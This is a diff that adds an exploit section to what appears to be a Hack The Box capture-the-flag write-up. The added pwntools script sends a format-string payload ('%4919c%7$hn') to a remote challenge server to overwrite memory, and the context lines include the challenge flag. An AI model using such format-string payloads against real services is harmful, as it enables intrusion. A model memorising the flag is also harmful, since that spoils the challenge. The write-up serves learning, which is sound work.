@@ -110,4 +110,21 @@ Your card is:
 [+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!}
 ```
 
+Now to craft the exploit.
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+payload = b"%4919c%7$hn"
+
+p = remote("157.245.32.12", 31901)
+p.recvuntil("> ")
+p.sendline(b"1")
+p.recvuntil("Insert card's serial number: ")
+p.sendline(payload)
+
+p.interactive()
+```
+
 Et Voila!
